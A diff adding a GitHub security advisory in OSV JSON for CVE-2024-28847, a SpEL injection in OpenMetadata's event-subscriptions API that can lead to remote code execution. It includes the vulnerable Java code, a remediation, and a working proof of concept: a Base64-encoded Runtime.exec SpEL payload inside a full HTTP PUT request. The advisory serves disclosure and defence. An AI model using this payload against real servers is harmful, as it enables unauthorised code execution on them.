@@ -1,0 +1,85 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-8p5r-6mvv-2435",
+  "modified": "2024-04-24T17:06:00Z",
+  "published": "2024-04-24T17:06:00Z",
+  "aliases": [
+    "CVE-2024-28847"
+  ],
+  "summary": "OpenMetadata vulnerable to a SpEL Injection in `PUT /api/v1/events/subscriptions` (`GHSL-2023-251`)",
+  "details": "### SpEL Injection in `PUT /api/v1/events/subscriptions` (`GHSL-2023-251`)\n\n***Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***\n\nSimilarly to the GHSL-2023-250 issue, `AlertUtil::validateExpression` is also called from [`EventSubscriptionRepository.prepare()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EventSubscriptionRepository.java#L69-L83), which can lead to Remote Code Execution.\n\n```java\n  @Override\n  public void prepare(EventSubscription entity, boolean update) {\n    validateFilterRules(entity);\n  }\n\n  private void validateFilterRules(EventSubscription entity) {\n    // Resolve JSON blobs into Rule object and perform schema based validation\n    if (entity.getFilteringRules() != null) {\n      List<EventFilterRule> rules = entity.getFilteringRules().getRules();\n      // Validate all the expressions in the rule\n      for (EventFilterRule rule : rules) {\n        AlertUtil.validateExpression(rule.getCondition(), Boolean.class);\n      }\n      rules.sort(Comparator.comparing(EventFilterRule::getName));\n    }\n  }\n```\n\n`prepare()` is called from [`EntityRepository.prepareInternal()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java#L693) which, in turn, gets called from the [`EntityResource.createOrUpdate()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java#L219):\n\n```java\npublic Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) {\n  repository.prepareInternal(entity, true);\n\n  // If entity does not exist, this is a create operation, else update operation\n  ResourceContext<T> resourceContext = getResourceContextByName(entity.getFullyQualifiedName());\n  MetadataOperation operation = createOrUpdateOperation(resourceContext);\n  OperationContext operationContext = new OperationContext(entityType, operation);\n  if (operation == CREATE) {\n    CreateResourceContext<T> createResourceContext = new CreateResourceContext<>(entityType, entity);\n    authorizer.authorize(securityContext, operationContext, createResourceContext);\n    entity = addHref(uriInfo, repository.create(uriInfo, entity));\n    return new PutResponse<>(Response.Status.CREATED, entity, RestUtil.ENTITY_CREATED).toResponse();\n  }\n  authorizer.authorize(securityContext, operationContext, resourceContext);\n  PutResponse<T> response = repository.createOrUpdate(uriInfo, entity);\n  addHref(uriInfo, response.getEntity());\n  return response.toResponse();\n}\n```\n\nNote that, even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and, therefore, after the SpEL expression has been evaluated.\n\nIn order to reach this method, an attacker can send a PUT request to `/api/v1/events/subscriptions` which gets handled by [`EventSubscriptionResource.createOrUpdateEventSubscription()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java#L289):\n\n```java\n@PUT\n@Operation(\n    operationId = \"createOrUpdateEventSubscription\",\n    summary = \"Updated an existing or create a new Event Subscription\",\n    description = \"Updated an existing or create a new Event Subscription\",\n    responses = {\n      @ApiResponse(\n          responseCode = \"200\",\n          description = \"create Event Subscription\",\n          content =\n              @Content(\n                  mediaType = \"application/json\",\n                  schema = @Schema(implementation = CreateEventSubscription.class))),\n      @ApiResponse(responseCode = \"400\", description = \"Bad request\")\n    })\npublic Response createOrUpdateEventSubscription(\n    @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreateEventSubscription create) {\n  // Only one Creation is allowed for Data Insight\n  if (create.getAlertType() == CreateEventSubscription.AlertType.DATA_INSIGHT_REPORT) {\n    try {\n      repository.getByName(null, create.getName(), repository.getFields(\"id\"));\n    } catch (EntityNotFoundException ex) {\n      if (ReportsHandler.getInstance() != null && ReportsHandler.getInstance().getReportMap().size() > 0) {\n        throw new BadRequestException(\"Data Insight Report Alert already exists.\");\n      }\n    }\n  }\n  EventSubscription eventSub = getEventSubscription(create, securityContext.getUserPrincipal().getName());\n  Response response = createOrUpdate(uriInfo, securityContext, eventSub);\n  repository.updateEventSubscription((EventSubscription) response.getEntity());\n  return response;\n}\n```\n\nThis vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.\n\n#### Proof of concept\n- Prepare the payload\n\t- Encode the command to be run (eg: `touch /tmp/pwned`) using Base64 (eg: `dG91Y2ggL3RtcC9wd25lZA==`)\n\t- Create the SpEL expression to run the system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(\"dG91Y2ggL3RtcC9wd25lZA==\")))`\n- Send the payload using a valid JWT token:\n```http\nPUT /api/v1/events/subscriptions HTTP/1.1\nHost: localhost:8585\nAuthorization: Bearer <non-admin JWT>\naccept: application/json\nConnection: close\nContent-Type: application/json\nContent-Length: 353\n\n{\n\"name\":\"ActivityFeedAlert\",\"displayName\":\"Activity Feed Alerts\",\"alertType\":\"ChangeEvent\",\"filteringRules\":{\"rules\":[\n{\"name\":\"pwn\",\"effect\":\"exclude\",\"condition\":\"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA==')))\"}]},\"subscriptionType\":\"ActivityFeed\",\"enabled\":true\n}\n```\n- Verify that a file called `/tmp/pwned` was created in the OpenMetadata server\n#### Impact\n\nThis issue may lead to Remote Code Execution.\n\n#### Remediation\n\nUse [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.open-metadata:openmetadata-service"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.2.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-8p5r-6mvv-2435"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28847"
+    },
+    {
+      "type": "WEB",
+      "url": "https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/open-metadata/OpenMetadata"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java#L693"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EventSubscriptionRepository.java#L69-L83"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java#L219"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java#L289"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-24T17:06:00Z",
+    "nvd_published_at": "2024-03-15T20:15:10Z"
+  }
+}
